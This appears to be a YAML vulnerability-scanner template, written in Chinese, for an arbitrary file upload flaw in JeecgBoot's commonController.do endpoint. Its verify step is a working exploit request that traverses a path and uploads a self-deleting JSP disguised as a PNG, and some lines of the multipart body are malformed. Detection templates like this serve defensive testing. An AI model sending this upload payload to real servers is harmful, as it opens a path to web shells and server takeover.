app: JeecgBoot
query: app:"JeecgBoot"
meta:
  name: Jeecg任意文件上传漏洞
  level: 3
  tags:
  - file_upload
  description: Jeecg 快速开发平台，可以应用在任何J2EE项目的开发中，尤其适合企业信息管理系统（MIS）、内部办公系统（OA）、企业资源计划系统（ERP）、客户关系管理系统（CRM）等，其半智能手工Merge的开发方式，可以显著提高开发效率70%以上，极大降低开发成本。其commonController.do接口存在任意文件上传漏洞，可悲攻击者上传恶意脚本，导致服务器被控。
  homepage: ""
  author: X prism
  references: https://wiki.ztian.red/page?item=docs/%E4%B8%93%E9%A1%B9%E8%A1%8C%E5%8A%A8/Jeecg%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
  solution: 升级到最新版
  create_at: "2024-08-22 11:32:58"
  available: false
  steps:
    variable: []
    verify_steps:
      type: and
      verify:
      - request:
          method: POST
          path: /api/../commonController.do?parserXml
          redirect: true
          header:
          - Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygcflwtei
          params: |-
            ------WebKitFormBoundarygcflwtei
            Content-Disposition: form-data; "name="name"

            zW9YCa.png
            ------WebKitFormBoundarygcflwtei
            ontent-Disposition: form-data; name="documentTitle"

            blank
            ------WebKitFormBoundarygcflwtei
            Content-Disposition: form-data; name="file"; filename="zW9YCa.jsp"
            Content-Type: image/png

            <% out.println("HelloWorld");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
            ------WebKitFormBoundarygcflwtei--
        response:
        - name: code
          value: "200"
          type: equals
        - name: body
          value: 操作成功
          type: contains
    exploit_steps:
      type: ""
      params:
        name: ""
        type: input
        value: ""
